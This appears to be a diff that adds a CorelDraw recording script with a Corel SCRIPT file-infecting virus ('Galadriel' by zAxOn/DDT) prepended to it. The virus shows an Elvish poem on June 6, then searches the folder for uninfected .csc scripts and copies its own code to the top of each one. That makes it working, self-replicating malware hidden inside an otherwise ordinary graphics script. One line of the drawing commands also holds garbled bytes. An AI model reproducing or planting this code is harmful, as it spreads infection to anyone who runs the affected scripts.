@@ -1,0 +1,97 @@
+REM ViRUS GaLaDRieL FOR COREL SCRIPT bY zAxOn/DDT
+fecha$=GetCurrDate ()								
+If Left(fecha$,1)="6" Then If Mid(fecha$,3,2)="06" Then Goto Elessar
+Goto Palantir
+Elessar:
+Mensajito$= "			
+Ai! laurië lantar lassi súrinen!. 
+Yéni únótime ve rámar aldaron,
+yéni ve linte yuldar vánier
+mi oromardi lisse-miruvóreva
+Andúne pella Vardo tellumar
+nu luini yassen tintilar i eleni
+ómaryo airetári-lirinen.
+	...."
+Titulo = "GaLaDRieL ViRUS bY zAxOn/DDT"
+Messagebox Mensajito$,Titulo,64
+Palantir:
+nombre$=FindFirstFolder ("*.csc",32 or 128)		
+Do while not nombre$=""
+Open nombre$ For Input As #1
+Palacios_Intemporales:
+Line Input #1,linea$
+If linea$="" then goto Palacios_Intemporales
+if victima_bool=1 Then Goto Esgaroth
+If Instr(linea$,"REM ViRUS",1)=0 then
+victima$=nombre$
+victima_bool=1
+End if
+Esgaroth:
+If Instr(linea$,"REM ViRUS",1)<> 0 Then 
+yo_estoy_en$=nombre$
+conocimiento=1
+End if
+Close 
+If conocimiento=1 Then If victima_bool=1 Then Goto LothLorien
+nombre$=FindNextFolder ()
+If nombre$="" Then Goto Los_Puertos_Grises
+Loop
+LothLorien:								
+Kill "mallorn.tmp"
+Rename victima$,"mallorn.tmp",0
+Open yo_estoy_en$ For Input As #1
+open victima$ For Output As #2
+Do While Not Left(linea$,7)="REM END"
+Line Input #1,linea$
+Print #2,linea$
+Loop
+Line Input #1,linea$
+Print #2,linea$
+Close
+Open victima$ For Append As #1
+Open "mallorn.tmp" For Input As #2
+Do While Not Eof(2)
+Line Input #2,linea$
+Print #1,linea$
+Loop
+Close
+Kill "mallorn.tmp"								
+Los_Puertos_Grises:								
+REM END OF ViRUS GaLaDRieL bY zAxOn/DDT
+
+REM 
+REM REM Converted from a DRAW PRESET binary to a DRAW RECORDING script
+
+WITHOBJECT "CorelDraw.Automation.7"
+	.StartOfRecording 
+	.SuppressPainting 
+	.RecorderStorePreselectedObjects TRUE
+	.RecorderSelectObjectByIndex TRUE, 1
+	.ApplyOutline 0, 0, 0, 0, 0, 0, 0, -1, -1, FALSE, 0, 0, FALSE
+	.RecorderSelectObjectByIndex TRUE, 1
+	.DuplicateObject 0, 0
+	.RecorderSelectObjectByIndex TRUE, 2
+	.StretchObject 0.836417, 1, 0.836417, 1, FALSE, FALSE, 5
+	.RecorderSelectObjectByIndex TRUE, 2
+	.ApplyUniformFillColor 2, 0, 0, 0, 40
+	.RecorderSelectObjectByIndex TRUE, 1
+	.ApplyUniformFillColor 2, 0, 0, 0, 0
+	.RecorderSelectPreselectedObjects TRUE
+	.RecorderSelectObjectsByIndex FALSE, 2, -1, -1, -1, -1
+	.ApplyBlend TRUE, 20, 0, FALSE, 0, FALSE, FALSE, 0, 0, 0, TRUE, TRUE, FALSE, FA|üGPLSE, 0, 0, 0, 0
+	.RecorderSelectObjectByIndex TRUE, 1
+	.DuplicateObject 0, 0
+	.RecorderSelectObjectByIndex TRUE, 4
+	.MoveObject -19303, 13461
+	.RecorderSelectObjectByIndex TRUE, 4
+	.ApplyUniformFillColor 2, 0, 100, 100, 0
+	.RecorderSelectObjectByIndex TRUE, 4
+	.OrderToFront 
+	.RecorderSelectObjectByIndex TRUE, 4
+	.MoveObject -2793, 7365
+	.RecorderSelectPreselectedObjects TRUE
+	.RecorderSelectObjectsByIndex FALSE, 4, 3, 2, -1, -1
+	.Group 
+	.ResumePainting 
+	.EndOfRecording 
+END WITHOBJECT
